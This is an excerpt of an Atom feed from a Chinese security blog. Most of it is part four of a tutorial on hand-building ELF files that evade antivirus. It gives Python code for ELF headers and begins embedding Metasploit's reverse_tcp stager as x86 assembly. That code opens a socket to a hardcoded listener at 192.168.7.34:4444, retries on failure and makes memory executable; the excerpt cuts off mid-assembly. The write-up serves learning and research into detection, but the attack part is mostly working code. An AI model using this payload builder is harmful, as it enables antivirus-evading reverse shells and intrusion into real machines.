      <category term="杀软的无奈" scheme="http://blog.wonderkun.cc/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-21551内核提取漏洞学习</title>
    <link href="http://blog.wonderkun.cc/2021/05/24/CVE-2021-21551%E5%86%85%E6%A0%B8%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://blog.wonderkun.cc/2021/05/24/CVE-2021-21551内核提取漏洞学习/</id>
    <published>2021-05-24T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<p><strong>先占坑，防止我日后偷懒又不学了</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;先占坑，防止我日后偷懒又不学了&lt;/strong&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="windows" scheme="http://blog.wonderkun.cc/tags/windows/"/>
    
      <category term="pwn" scheme="http://blog.wonderkun.cc/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>杀软的无奈-手工构建免杀的ELF文件(四)</title>
    <link href="http://blog.wonderkun.cc/2021/05/16/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%89%8B%E5%B7%A5%E6%9E%84%E5%BB%BA%E5%85%8D%E6%9D%80%E7%9A%84ELF%E6%96%87%E4%BB%B6(%E5%9B%9B)/"/>
    <id>http://blog.wonderkun.cc/2021/05/16/杀软的无奈-手工构建免杀的ELF文件(四)/</id>
    <published>2021-05-16T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242551" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242551</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一节我们利用模拟执行工具 unicorn 分析了 metasploit 生成的 shellcode 的执行过程和编码器 <code>x86/shikata_ga_nai</code> 的解码逻辑， 并依据 metasploit 的源代码分析了 payload 的生成过程。<br>从生成过程中我们也可以发现编码器的静态特征比较明显，容易被反病毒软件静态识别。为了逃避过杀毒软件的静态查杀，本文主要讲解如何实现自己的编码器进行代码编码并且手工构建ELF文件，因为ruby语言实在的不熟悉，所以本文暂时不会基于metasploit开发，主要还是使用我比较顺手的语言 python 进行开发。</p><a id="more"></a><h2 id="手工构建ELF文件"><a href="#手工构建ELF文件" class="headerlink" title="手工构建ELF文件"></a>手工构建ELF文件</h2><p>要想手工构建ELF文件，那必然是避免不了操作elf的文件结构。我一直以为python不能像c那样方便的把数据赋值给结构体进行解析，或者将结构体dump为具体的数据，但实则不然。 在一次读文档的时候我发现了 python 竟然可以类似于 C 的方式轻松的解析数据为结构体，dump 结构体的内容为数据。</p><p>具体的操作方式看如下的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> c</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pointer</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"x"</span>,c.c_int),</span><br><span class="line">        (<span class="string">"y"</span>,c.c_int),</span><br><span class="line">        (<span class="string">"z"</span>,c.c_int)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结构体dump字节数据</span></span><br><span class="line">p = Pointer(x=<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>)</span><br><span class="line">t = c.string_at(c.addressof(p),c.sizeof(p))</span><br><span class="line">print( t )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节数据转化为结构体</span></span><br><span class="line">bytes_p = <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"</span></span><br><span class="line">new_p = Pointer()</span><br><span class="line">c.memmove(c.addressof(new_p),bytes_p,c.sizeof(Pointer))</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">print(<span class="string">"recover Point:"</span>,hex(new_p.x),hex(new_p.y),hex(new_p.z))</span><br></pre></td></tr></table></figure><p>有了上面的方法，操作结构体就和c语言差别不大了，接下来写代码就非常方便了。</p><h3 id="定义文件框架结构"><a href="#定义文件框架结构" class="headerlink" title="定义文件框架结构"></a>定义文件框架结构</h3><p>由于我们是要用shellcode来构架elf文件，所以我们的代码肯定是地址无关的，所以只用构建ELF文件的执行视图即可，不需要构建链接视图。</p><p>所以接下来的代码比较简单，我就不再详细赘述了，直接贴上来吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> k</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ARCH = "x86"</span></span><br><span class="line">ARCH = <span class="string">"x86_64"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">    ElfN_Addr = c.c_uint</span><br><span class="line">    ElfN_Off = c.c_uint</span><br><span class="line">    ElfN_Word = c.c_uint</span><br><span class="line">    ElfN_SWord = c.c_uint</span><br><span class="line">    ElfN_Half = c.c_ushort</span><br><span class="line">    EI_CLASS = <span class="number">0x1</span></span><br><span class="line">    e_machine = <span class="number">0x3</span></span><br><span class="line">    MEM_VADDR = <span class="number">0x08048000</span></span><br><span class="line">    FILENAME = <span class="string">"test_x86.elf"</span></span><br><span class="line">    MODE = k.KS_MODE_32</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ElfN_Addr = c.c_ulonglong</span><br><span class="line">    ElfN_Off = c.c_ulonglong</span><br><span class="line">    ElfN_Word = c.c_uint</span><br><span class="line">    ElfN_SWord = c.c_int</span><br><span class="line">    ElfN_Half = c.c_ushort</span><br><span class="line">    EI_CLASS = <span class="number">0x2</span></span><br><span class="line">    e_machine = <span class="number">0x3E</span></span><br><span class="line">    MEM_VADDR = <span class="number">0x400000</span></span><br><span class="line">    FILENAME = <span class="string">"test_x86_64.elf"</span></span><br><span class="line">    MODE = k.KS_MODE_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://man7.org/linux/man-pages/man5/elf.5.html</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElfN_Ehdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="comment"># 定义elf文件头</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        typedef struct &#123;</span></span><br><span class="line"><span class="string">            unsigned char e_ident[EI_NIDENT];</span></span><br><span class="line"><span class="string">            uint16_t      e_type;</span></span><br><span class="line"><span class="string">            uint16_t      e_machine;</span></span><br><span class="line"><span class="string">            uint32_t      e_version;</span></span><br><span class="line"><span class="string">            ElfN_Addr     e_entry;</span></span><br><span class="line"><span class="string">            ElfN_Off      e_phoff;</span></span><br><span class="line"><span class="string">            ElfN_Off      e_shoff;</span></span><br><span class="line"><span class="string">            uint32_t      e_flags;</span></span><br><span class="line"><span class="string">            uint16_t      e_ehsize;</span></span><br><span class="line"><span class="string">            uint16_t      e_phentsize;</span></span><br><span class="line"><span class="string">            uint16_t      e_phnum;</span></span><br><span class="line"><span class="string">            uint16_t      e_shentsize;</span></span><br><span class="line"><span class="string">            uint16_t      e_shnum;</span></span><br><span class="line"><span class="string">            uint16_t      e_shstrndx;</span></span><br><span class="line"><span class="string">        &#125; ElfN_Ehdr;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    EI_NIDENT = <span class="number">16</span></span><br><span class="line">    _pack_ = <span class="number">1</span> </span><br><span class="line">    <span class="comment"># print("[*] : &#123;&#125;".format(c.sizeof(ElfN_Addr)))</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"e_ident"</span>,c.c_ubyte*EI_NIDENT),</span><br><span class="line">        (<span class="string">"e_type"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_machine"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_version"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"e_entry"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"e_phoff"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"e_shoff"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"e_flags"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"e_ehsize"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_phentsize"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_phnum"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_shentsize"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_shnum"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_shstrndx"</span>,ElfN_Half)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Phdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="comment"># 定义 programe header</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        typedef struct &#123;</span></span><br><span class="line"><span class="string">            uint32_t   p_type;</span></span><br><span class="line"><span class="string">            Elf32_Off  p_offset;</span></span><br><span class="line"><span class="string">            Elf32_Addr p_vaddr;</span></span><br><span class="line"><span class="string">            Elf32_Addr p_paddr;</span></span><br><span class="line"><span class="string">            uint32_t   p_filesz;</span></span><br><span class="line"><span class="string">            uint32_t   p_memsz;</span></span><br><span class="line"><span class="string">            uint32_t   p_flags;</span></span><br><span class="line"><span class="string">            uint32_t   p_align;</span></span><br><span class="line"><span class="string">        &#125; Elf32_Phdr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"p_type"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_offset"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_vaddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_paddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_filesz"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_memsz"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_flags"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_align"</span>,ElfN_Word)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Phdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        typedef struct &#123;</span></span><br><span class="line"><span class="string">            uint32_t   p_type;</span></span><br><span class="line"><span class="string">            uint32_t   p_flags;</span></span><br><span class="line"><span class="string">            Elf64_Off  p_offset;</span></span><br><span class="line"><span class="string">            Elf64_Addr p_vaddr;</span></span><br><span class="line"><span class="string">            Elf64_Addr p_paddr;</span></span><br><span class="line"><span class="string">            uint64_t   p_filesz;</span></span><br><span class="line"><span class="string">            uint64_t   p_memsz;</span></span><br><span class="line"><span class="string">            uint64_t   p_align;</span></span><br><span class="line"><span class="string">        &#125; Elf64_Phdr;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"p_type"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"p_flags"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"p_offset"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_vaddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_paddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_filesz"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_memsz"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_align"</span>,ElfN_Off)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">    ElfN_Phdr = Elf32_Phdr</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ElfN_Phdr = Elf64_Phdr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_elf_header</span><span class="params">()</span>:</span></span><br><span class="line">    elf_header = ElfN_Ehdr()</span><br><span class="line">    elf_header.e_ident = (</span><br><span class="line">            <span class="number">0x7f</span>,</span><br><span class="line">            ord(<span class="string">"E"</span>),</span><br><span class="line">            ord(<span class="string">"L"</span>),</span><br><span class="line">            ord(<span class="string">"F"</span>),</span><br><span class="line">            EI_CLASS,</span><br><span class="line">            <span class="number">0x1</span>,</span><br><span class="line">            <span class="number">0x1</span></span><br><span class="line">        )</span><br><span class="line">    elf_header.e_type = <span class="number">0x2</span></span><br><span class="line">    elf_header.e_machine = e_machine</span><br><span class="line">    elf_header.e_version = <span class="number">0x1</span></span><br><span class="line">    elf_header.e_entry = <span class="number">0x0</span> <span class="comment"># 补充</span></span><br><span class="line"></span><br><span class="line">    elf_header.e_phoff = c.sizeof(ElfN_Ehdr)</span><br><span class="line">    elf_header.e_shoff = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_flags = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_ehsize = c.sizeof(ElfN_Ehdr)</span><br><span class="line"></span><br><span class="line">    elf_header.e_phentsize = c.sizeof( ElfN_Phdr )</span><br><span class="line">    elf_header.e_phnum = <span class="number">0x1</span></span><br><span class="line">    elf_header.e_shentsize = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_shnum = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_shstrndx = <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">return</span> elf_header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_elf_pheader</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> MEM_VADDR</span><br><span class="line">    elf_pheader = ElfN_Phdr()</span><br><span class="line">    elf_pheader.p_type = <span class="number">0x1</span></span><br><span class="line">    elf_pheader.p_flags = <span class="number">0x7</span> </span><br><span class="line">    elf_pheader.p_offset = <span class="number">0x0</span></span><br><span class="line">    elf_pheader.p_vaddr = MEM_VADDR</span><br><span class="line">    elf_pheader.p_paddr = MEM_VADDR</span><br><span class="line">    elf_pheader.p_filesz = <span class="number">0</span> <span class="comment"># 文件大小 </span></span><br><span class="line">    elf_pheader.p_memsz = <span class="number">0</span> <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">    elf_pheader.p_align = <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">return</span> elf_pheader</span><br><span class="line">shellcode = [</span><br><span class="line">   <span class="number">0x90</span>,<span class="number">0x90</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    elf_header = build_elf_header()</span><br><span class="line">    elf_pheader = build_elf_pheader()</span><br><span class="line">    elf_header.e_entry = elf_pheader.p_vaddr + c.sizeof( elf_header ) + c.sizeof( elf_pheader ) </span><br><span class="line">    </span><br><span class="line">    shellcode = <span class="string">""</span>.join( </span><br><span class="line">            [ </span><br><span class="line">                chr( i ) <span class="keyword">for</span> i <span class="keyword">in</span> shellcode </span><br><span class="line">            ] </span><br><span class="line">        ).encode(<span class="string">"latin-1"</span>)</span><br><span class="line">    </span><br><span class="line">    elf_pheader.p_filesz = c.sizeof( elf_header ) + c.sizeof( elf_pheader )  + len(shellcode)</span><br><span class="line">    elf_pheader.p_memsz  = elf_pheader.p_filesz + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span><br><span class="line">    elf_pheader_bytes = c.string_at(c.addressof(elf_pheader),c.sizeof(elf_pheader))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.write( elf_header_bytes + elf_pheader_bytes + shellcode )</span><br></pre></td></tr></table></figure><h3 id="插入shellcode"><a href="#插入shellcode" class="headerlink" title="插入shellcode"></a>插入shellcode</h3><p>上述elf文件是可以执行，但是啥都没干。为了实现 meterpreter reverse_tcp 的功能，我们这里利用把metasploit中的shellcode代码copy过来，在这里进行汇编，写入elf文件中。</p><p>写如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_shellcode</span><span class="params">(retry_count = <span class="number">10</span>,host=<span class="string">"192.168.7.34"</span>,port=<span class="string">"4444"</span>)</span>:</span></span><br><span class="line">    ks = k.Ks(k.KS_ARCH_X86,MODE)</span><br><span class="line"></span><br><span class="line">    encoded_host = hex(sum([<span class="number">256</span>**j*int(i) <span class="keyword">for</span> j,i <span class="keyword">in</span> enumerate(host.split(<span class="string">'.'</span>))]))</span><br><span class="line"></span><br><span class="line">    encoded_port = hex( struct.unpack(<span class="string">"&gt;I"</span>,struct.pack(<span class="string">"&lt;HH"</span>,int(port),<span class="number">0x0200</span>))[<span class="number">0</span>] )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">        shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">            push &#123;retry_count&#125;</span></span><br><span class="line"><span class="string">            pop esi ;</span></span><br><span class="line"><span class="string">        create_socket:</span></span><br><span class="line"><span class="string">            xor ebx, ebx ;</span></span><br><span class="line"><span class="string">            mul ebx ;</span></span><br><span class="line"><span class="string">            push ebx ;</span></span><br><span class="line"><span class="string">            inc ebx ;</span></span><br><span class="line"><span class="string">            push ebx ;</span></span><br><span class="line"><span class="string">            push 0x2 ;</span></span><br><span class="line"><span class="string">            mov al, 0x66 ;</span></span><br><span class="line"><span class="string">            mov ecx, esp ;</span></span><br><span class="line"><span class="string">            int 0x80 </span></span><br><span class="line"><span class="string">            xchg eax, edi   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        set_address:</span></span><br><span class="line"><span class="string">            pop ebx            </span></span><br><span class="line"><span class="string">            push &#123;encoded_host&#125;</span></span><br><span class="line"><span class="string">            push &#123;encoded_port&#125;</span></span><br><span class="line"><span class="string">            mov ecx, esp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        try_connect:</span></span><br><span class="line"><span class="string">            push 0x66</span></span><br><span class="line"><span class="string">            pop eax</span></span><br><span class="line"><span class="string">            push eax</span></span><br><span class="line"><span class="string">            push ecx</span></span><br><span class="line"><span class="string">            push edi</span></span><br><span class="line"><span class="string">            mov ecx, esp</span></span><br><span class="line"><span class="string">            inc ebx</span></span><br><span class="line"><span class="string">            int 0x80    </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            jns mprotect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        handle_failure:</span></span><br><span class="line"><span class="string">            dec esi</span></span><br><span class="line"><span class="string">            jz failed</span></span><br><span class="line"><span class="string">            push 0xa2</span></span><br><span class="line"><span class="string">            pop eax</span></span><br><span class="line"><span class="string">            push 0x0</span></span><br><span class="line"><span class="string">            push 0x5</span></span><br><span class="line"><span class="string">            mov ebx, esp</span></span><br><span class="line"><span class="string">            xor ecx, ecx</span></span><br><span class="line"><span class="string">            int 0x80  </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            jns create_socket</span></span><br><span class="line"><span class="string">            jmp failed</span></span><br><span class="line"><span class="string">        mprotect:</span></span><br><span class="line"><span class="string">            mov dl, 0x7</span></span><br><span class="line"><span class="string">            mov ecx, 0x1000</span></span><br><span class="line"><span class="string">            mov ebx, esp</span></span><br><span class="line"><span class="string">            shr ebx, 0xc</span></span><br><span class="line"><span class="string">            shl ebx, 0xc</span></span><br><span class="line"><span class="string">            mov al, 0x7d</span></span><br><span class="line"><span class="string">            int 0x80  </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string"></span></span><br><span 